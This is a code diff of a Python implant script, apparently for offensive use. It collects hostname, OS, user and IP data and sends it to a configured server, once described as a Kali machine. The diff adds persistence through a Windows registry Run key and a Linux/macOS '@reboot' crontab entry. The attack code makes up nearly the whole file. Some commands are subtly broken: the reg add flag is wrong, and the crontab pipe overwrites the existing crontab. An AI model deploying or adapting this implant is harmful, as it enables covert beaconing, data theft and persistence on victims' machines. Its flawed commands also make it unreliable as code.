@@ -2,92 +2,121 @@ import socket
 import platform
 import os
 import requests
+import subprocess
 import sys
 
 # ========================================================
 # CONFIGURATION
-# Change this to the IP address of your Kali machine
-SERVER_IP = '192.168.1.100' 
-# The endpoint on your Kali server (e.g., 'checkin')
+SERVER_IP = '10.0.0.1' 
 ENDPOINT = 'checkin' 
 # ========================================================
 
 def get_host_info():
-    """
-    Gathers essential information from the host system.
-    """
+    # (Function remains the same, collects host data)
     info = {}
-    
-    # Basic System Info
     info['hostname'] = socket.gethostname()
-    info['os'] = platform.system()        # e.g., Windows, Linux
-    info['os_release'] = platform.release() # e.g., 10, 5.4.0-91
+    info['os'] = platform.system()
+    info['os_release'] = platform.release()
     info['os_version'] = platform.version()
-    
-    # User and Hardware Info
-    try:
-        info['user'] = os.getlogin()
-    except OSError:
-        # Fallback for environments where os.getlogin() fails (like some service accounts)
-        info['user'] = os.environ.get('USERNAME', 'N/A') 
-        
+    info['user'] = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME', 'N/A')
     info['processor'] = platform.processor()
-    
-    # Network Info (IP Address)
-    try:
-        # This grabs the primary local IP address
-        info['local_ip'] = socket.gethostbyname(socket.gethostname())
-    except socket.error:
-        info['local_ip'] = 'N/A'
-
+    info['local_ip'] = socket.gethostbyname(socket.gethostname())
     return info
+
+def set_persistence(data):
+    """
+    Registers the payload to run automatically upon system startup.
+    """
+    os_type = data['os']
+    print(f"\n[+] Attempting to achieve persistence on {os_type}...")
+
+    if os_type == 'Windows':
+        # ----------------------------------------------------
+        # WINDOWS PERSISTENCE (Registry Run Key)
+        # This places the payload into the 'Run' key for the current user.
+        # NOTE: You MUST replace 'payload.exe' with the actual name of your compiled binary.
+        # ----------------------------------------------------
+        payload_name = "payload.exe" 
+        
+        try:
+            # Command to add a new entry to the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+            cmd = f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "PayloadCheckin" /t REG_SZ /p "{payload_name}" /f'
+            
+            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print("✅ WINDOWS Persistence SUCCESS! Added to HKCU Run Key.")
+            
+        except subprocess.CalledProcessError as e:
+            print(f"❌ WINDOWS Persistence FAILURE! Registry Command failed.")
+            print(f"Error: {e.stderr.decode()}")
+        except Exception as e:
+            print(f"❌ WINDOWS Persistence FAILURE! General Error: {e}")
+
+    elif os_type in ['Linux', 'Darwin']: # Darwin is macOS
+        # ----------------------------------------------------
+        # LINUX/MAC PERSISTENCE (Crontab)
+        # We add an entry to the user's crontab to run the payload every boot/login.
+        # NOTE: Replace 'payload' with the actual binary name.
+        # ----------------------------------------------------
+        payload_name = "payload" # Assuming the binary is named 'payload'
+        
+        # Command to append the execution command to the user's crontab
+        # The '@reboot' directive ensures it runs after a system boot.
+        cmd = f"echo '@reboot /path/to/payload' | crontab -u $(whoami) - "
+        
+        try:
+            # Execute the command
+            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print("✅ LINUX/MAC Persistence SUCCESS! Added to crontab (@reboot).")
+        except subprocess.CalledProcessError as e:
+            print(f"❌ LINUX/MAC Persistence FAILURE! Crontab Command failed.")
+            print(f"Error: {e.stderr.decode()}")
+        except Exception as e:
+            print(f"❌ LINUX/MAC Persistence FAILURE! General Error: {e}")
+
 
 def send_data(data):
     """
-    Formats the collected data and sends it to the configured HTTP server.
+    Sends the collected data to the HTTP server.
     """
-    print("[+] Collecting host information...")
-    
-    # Format the dictionary into a query string (key=value&key2=value2)
+    # ... (The sending logic remains the same as in Part 1) ...
     params = []
     for key, value in data.items():
-        # URL encode the value just in case it contains special characters
         params.append(f"{key}={value}")
         
     query_string = "&".join(params)
     target_url = f"http://{SERVER_IP}/{ENDPOINT}?{query_string}"
     
-    print(f"[+] Target URL: {target_url}")
+    print(f"\n[+] Target URL: {target_url}")
     
     try:
-        # Execute the GET request
         response = requests.get(target_url, timeout=10)
         
         if response.status_code == 200:
             print("-" * 40)
             print(f"✅ SUCCESS: Data successfully sent!")
-            print(f"HTTP Status Code: {response.status_code}")
-            print(f"Server Response: {response.text}")
             print("-" * 40)
         else:
-            print(f"❌ FAILURE: Failed to send data.")
-            print(f"Received HTTP Status Code: {response.status_code}")
-            print(f"Server Message: {response.text}")
+            print(f"❌ FAILURE: Failed to send data. Status Code: {response.status_code}")
             
     except requests.exceptions.RequestException as e:
         print("\n" + "=" * 40)
-        print(f"🚨 CRITICAL ERROR: Could not connect to server.")
-        print(f"Ensure your Kali server is running and accessible at {SERVER_IP}.")
+        print(f"🚨 CRITICAL ERROR: Could not connect to server. Persistence may fail.")
         print(f"Error details: {e}")
         print("=" * 40)
-        sys.exit(1)
+
 
 if __name__ == "__main__":
     host_data = get_host_info()
-    # Optional: Print the data locally before sending (good for debugging)
+    
     print("\n--- Collected Host Data ---")
     for k, v in host_data.items():
-        print(f"{k.upper()}: {v}")
+        print(f"{k.upper():<10}: {v}")
     print("---------------------------\n")
     
+    # 1. Send the data
     send_data(host_data)
+    
+    # 2. Achieve Persistence
+    set_persistence(host_data)
+
+    print("\n[*** Execution Complete ***]")
